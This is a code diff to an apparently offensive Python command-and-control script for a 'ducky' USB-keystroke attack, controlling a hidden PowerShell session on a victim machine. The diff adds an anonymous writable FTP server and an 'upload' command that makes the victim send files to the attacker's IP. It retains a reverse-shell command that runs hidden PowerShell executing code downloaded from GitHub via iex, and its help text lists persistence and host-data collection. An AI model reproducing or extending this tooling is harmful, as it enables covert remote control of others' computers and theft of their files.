@@ -6,10 +6,16 @@ import socket
 import threading
 import os
 import sys
+from time import sleep
+from pyftpdlib import servers
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.authorizers import DummyAuthorizer
 
 port = 8008 if len(sys.argv) == 1 else int(sys.argv[1])
 timeout = False
+
 stop = False
+stop_ftp = False
 
 
 def recv(conn):
@@ -18,6 +24,33 @@ def recv(conn):
     print()
 
 
+def ftp_server():
+    if os.getcwd().split("/")[-1] != "ftp":
+        os.chdir(os.getcwd() + "/ftp")
+    authorizer = DummyAuthorizer()
+    authorizer.add_anonymous(".", perm="elradfmw")
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    address = ("0.0.0.0", 21)
+    server = servers.FTPServer(address, handler)
+    server.set_reuse_addr()
+    threading.Thread(target=close_ftp_server, args=(server,)).start()
+    server.serve_forever()
+
+
+def close_ftp_server(server):
+    while not stop_ftp:
+        continue
+    server.close()
+
+
+if sys.platform[:5] == "linux" or sys.platform == "darwin":
+    attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
+elif sys.platform == "win32":
+    attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
+else:
+    print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
+    attacker_ip = input("Manual entry is required >> ")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 if timeout:
@@ -61,7 +94,7 @@ threading.Thread(target=recv, args=(conn,)).start()
 while not stop:
     stdin = input()
     if pid in stdin:
-        choice = input("[!] Are you sure you want to kill this Powershell process? Y/N\n")
+        choice = input("[!] Are you sure you want to kill this Powershell process? Y/N >> ")
         if choice.lower()[0] != "y":
             stdin = ""
             print("[-] Aborted.")
@@ -70,24 +103,26 @@ while not stop:
         if ducky_command[:4] == "help":
             print("Custom Ducky Commands\n")
             print("Usage: ducky/[command] [options]\n")
-            print("Command              Options     Description")
-            print("ducky/help           N/A         Show this help screen")
-            print("ducky/clear          N/A         Clear the terminal screen")
-            print("ducky/quit           -s          Leave a signature before exiting")
-            print("                     -p          Permanently exit, kill the Powershell process")
-            print("ducky/info           -a          Show all")
-            print("                     -u          Show username")
-            print("                     -h          Show hostname")
-            print("                     -ip         Show IP address")
-            print("                     -port       Show port")
-            print("                     -m          Show MAC address")
-            print("                     -n          Show network name")
-            print("                     -pid        Show Powershell PID")
-            print("                     -e          Show Powershell elevation status")
-            print("                     -os         Show operating system")
-            print("ducky/persistence    N/A         Set up a persistent shell")
-            print("                     -d          Delete the persistent shell")
-            print("ducky/reverse_shell  \"ip:port\"   Set up a custom reverse shell")
+            print("Command              Options      Description")
+            print("ducky/help           N/A          Show this help screen")
+            print("ducky/clear          N/A          Clear the terminal screen")
+            print("ducky/quit           -s           Leave a signature before exiting")
+            print("                     -p           Permanently exit, kill the Powershell process")
+            print("ducky/info           -a           Show all")
+            print("                     -u           Show username")
+            print("                     -h           Show hostname")
+            print("                     -ip          Show IP address")
+            print("                     -port        Show port")
+            print("                     -m           Show MAC address")
+            print("                     -n           Show network name")
+            print("                     -pid         Show Powershell PID")
+            print("                     -e           Show Powershell elevation status")
+            print("                     -os          Show operating system")
+            print("ducky/persistence    N/A          Set up a persistent shell")
+            print("                     -d           Delete the persistent shell")
+            print("ducky/reverse_shell  \"ip:port\"    Set up a custom reverse shell")
+            print("ducky/upload         \"filename\"   Upload a file to attacker machine using FTP")
+            print("                     -q           Close FTP server")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -139,19 +174,29 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:13] == "reverse_shell":
             options = [x for x in ducky_command.split(" ")[1:] if x]
-            attacker_ip = options[0].split(":")[0]
-            attacker_port = options[0].split(":")[1]
-            if attacker_ip.lower() == "localhost" or attacker_ip == "127.0.0.1":
-                if sys.platform[:5] == "linux" or sys.platform == "darwin":
-                    attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
-                elif sys.platform == "win32":
-                    attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
-                else:
-                    print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
-                    attacker_ip = input("Manual entry is required >> ")
+            input_attacker_ip = options[0].split(":")[0]
+            input_attacker_port = options[0].split(":")[1]
+            if input_attacker_ip.lower() == "localhost" or input_attacker_ip == "127.0.0.1":
+                input_attacker_ip = attacker_ip
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + attacker_ip + "\\\"; $port=" + attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
             stdin = "; ".join(commands)
+        elif ducky_command[:6] == "upload":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            if "-q" in options:
+                stop_ftp = True
+                sleep(1)
+                stop_ftp = False
+                stdin = ""
+            else:
+                filename = options[0]
+                threading.Thread(target=ftp_server).start()
+                commands = []
+                commands.append("out-file -inputobject \"put " + filename + "\" -encoding ascii ftp.txt")
+                commands.append("out-file -inputobject \"quit\" -encoding ascii -append ftp.txt")
+                commands.append("ftp -A -s:ftp.txt " + attacker_ip)
+                commands.append("rm ftp.txt")
+                stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
